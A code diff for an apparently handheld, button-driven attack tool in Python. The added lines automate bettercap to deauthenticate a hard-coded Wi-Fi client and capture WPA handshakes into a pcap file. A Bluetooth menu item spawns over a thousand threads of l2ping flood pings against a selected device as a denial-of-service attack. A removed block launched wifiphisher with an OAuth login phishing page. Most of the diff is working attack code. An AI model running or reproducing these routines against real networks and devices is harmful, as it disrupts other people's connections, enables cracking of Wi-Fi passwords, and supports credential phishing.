@@ -15,6 +15,17 @@ from lib.mojstd import *
 
 scroll_offset = 0
 max_visible_options = 7
+#Bettercap
+commands = [
+    'wifi.recon on',
+    'wifi.show',
+    'set net.sniff.verbose true',
+    'set net.sniff.filter ether proto 0x888e',
+    'set net.sniff.output wpa.pcap',
+    'net.sniff on',
+    'wifi.deauth bc:15:ac:76:5d:69'
+]
+
 #@functools.lru_cache(maxsize=236)
 def draw_menu(selected_index):
     global scroll_offset
@@ -103,7 +114,7 @@ while True:
                     selected_option = menu_options[selected_index]
 
                     if selected_option == "Wifi":
-                        menu_options = ["Pwnagotchi", "Wifiphisher"]
+                        menu_options = ["Pwnagotchi", "Wifiphisher", "Handshakes"]
                         selected_index = 0
 
                         #WIFI
@@ -126,22 +137,54 @@ while True:
                             elif GPIO.input(KEY_PRESS_PIN) == 0:
                                 selected_option = menu_options[selected_index]
 
-                                if selected_option == "Wifiphisher":
+                                if selected_option == "Handshakes":
                                     #menu_options = ["Pwnagotchi", "Wifiphisher"]
                                     #selected_index = 0
+                                    show_message("TEST")
+                                    os.system("sudo airmon-ng check kill")
+                                    os.system("sudo ifconfig wlan0 down && sudo iwconfig wlan0 mode monitor")
 
-                                    while True:
-                                        os.system('sudo wifiphisher -e "nevergonnagive" -p oauth-login > wifiphisher.log 2>&1')
-                                        show_message("DOING WIFI", 3)
+                                    time.sleep(2)
+                                    bettercap_process = subprocess.Popen(
+                                        ['sudo', 'bettercap', '-iface', 'wlan0'],
+                                        stdin=subprocess.PIPE,
+                                        stdout=subprocess.PIPE,
+                                        stderr=subprocess.PIPE,
+                                        text=True,
+                                        bufsize=1 #sono piccole memorie in cui vengono storati le cose temporaneamente, i byte vengono letti a blocchi è  più veloce
+                                    )
 
-                                        show_message("WIFIPHISHER")
+                                    time.sleep(0.5)
+                                    for i in commands:
+                                        bettercap_process.stdin.write(i+'\n')
+                                        bettercap_process.stdin.flush()
+                                        show_message(bettercap_process.stdout.readline(),2)
+                                        #
+                                        with open("output.txt", 'a') as file:
+                                            file.write(bettercap_process.stdout.readline())
+
+                                        #show_message(i, 1)
+
+                                    try:
+                                        while True:
+                                            output = bettercap_process.stdout.readline()
+                                            #if output == '' and bettercap_process.poll() is not None:
+                                             #   break
+                                            if output:
+                                                print(output.strip())
+                                    except KeyboardInterrupt:
+                                        # Terminate the Bettercap process if needed
+                                        bettercap_process.terminate()
+                                        bettercap_process.wait()  # Wait for the process to terminate
+
+
 
 
 
 
         elif selected_option == "Bluetooth":
             # Draw and handle the Network sub-menu
-            menu_options = ["Dos", "Ddos"]
+            menu_options = ["Dos", "Multiple attacks"]
             selected_index = 0
             time.sleep(0.20)
             #
@@ -192,24 +235,30 @@ while True:
                             elif GPIO.input(KEY_PRESS_PIN) == 0:
                                 selected_option = menu_options[selected_index]
 
-                                while True:
-                                    try:
-                                        mac = str(selected_option)
-                                        print(mac)
-                                        def DOS(mac):
-                                            os.system("sudo " + "hciconfig " + "hci0 " + "up")
-                                            os.system('sudo ' + 'l2ping -i hci0 -s ' + "600" +' -f ' + mac)
+                                #while True:
+                                mac = str(selected_option)
+                                print(mac)
+                                def DOS(a):
+                                        #os.system("sudo " + "hciconfig " + "hci0 " + "up")
+                                        #os.system('sudo l2ping -i hci0 -s 600 -f '+ mac)
+                                        subprocess.run(['sudo', 'l2ping', '-i', 'hci0', '-s', '600', '-f', a], capture_output=True, text=True)
+                                        #print(a)
+                                        #if result.stdout == "Can't connect: Host is down":
+                                          #   show_message("Error: HOST IS DOWN", 1)
+                                            #break
 
-                                        for i in range(0, 1025, 1):
-                                            show_message(f"""Dossing
-{mac} . . .""")
-                                            threading.Thread(target=DOS, args=[str(mac)]).start()
-                                            if GPIO.input(KEY3_PIN) == 0:
-                                                show_message("Exiting", 1)
-                                                break
-                                        break
 
-                                    except:
-                                        show_message("Error: HOST IS DOWN" ,1)
-                                        time.sleep(1)
+
+                                for i in range(0, 1025, 1):
+                                    show_message(f"""Dossing
+    {mac} . . .""")
+                                    threading.Thread(target=DOS, args=[str(mac)]).start()
+
+                                    if GPIO.input(KEY3_PIN) == 0:
+                                        show_message("Exiting", 1)
                                         break
+                                break
+
+
+                    elif selected_option == "Multiple attacks":
+                        pass
